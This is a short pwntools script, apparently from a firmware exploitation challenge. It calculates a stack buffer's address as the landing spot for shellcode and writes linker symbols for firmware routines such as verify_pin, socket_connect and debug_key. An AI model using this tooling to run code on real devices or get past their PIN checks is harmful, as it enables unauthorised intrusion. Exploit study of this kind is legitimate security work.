#!/usr/bin/python3
from pwn import *

stack_start = 0x20002000
stack_handle_client = 0x300 + 2*4
stack_main = 10*4
total_stack = stack_handle_client + stack_main
print("Total stack size: ", total_stack)
buf_addr = stack_start - total_stack
print(f"Buffer address: 0x{buf_addr:08x}")

elf = ELF('firmware', checksec=False)
symbols_file = open('symbols.ld', 'w')
symbols_file.write(f'PROVIDE(shell_addr = 0x{buf_addr:08x});\n')

def provide(name, symbol_name):
    sym = elf.symbols[symbol_name]
    symbols_file.write(f'PROVIDE({name} = 0x{sym:08x});\n')
    print(f'{name} at 0x{sym:08x}')

provide('reset', '_Z5resetv')
provide('debug_print', '_Z11debug_printPKc')
provide('debug_println', '_Z13debug_printlnPKc')
provide('debug_print_u32', '_Z15debug_print_u32m')
provide('debug_print_i32', '_Z15debug_print_i32l')
provide('socket_connect', '_ZN8socket_t7connectEPht')
provide('socket_print', '_ZN8socket_t5printEPKc')
provide('socket_write', '_ZN8socket_t5writeEPKhj')
provide('verify_pin', '_Z10verify_pinPc')
provide('sec_reset', '_Z9sec_resetv')
provide('delay', '_Z5delaym')
provide('usart_rx', '_ZN7usart_t2rxEv')
provide('usart_tx', '_ZN7usart_t2txEh')
provide('usart_tx_buf', '_ZN7usart_t6tx_bufEPKhj')
provide('usart_flush', '_ZN7usart_t5flushEv')
provide('usart_avail', '_ZNK7usart_t5availEv')
provide('usart_rx_buf', '_ZN7usart_t6rx_bufEPhj')
provide('xmemset', '_Z6memsetPvij')
provide('w5500', 'w5500')
provide('usart_sec', 'usart_sec')
provide('debug_key', 'debug_key')
provide('debug_enabled', 'debug_enabled')
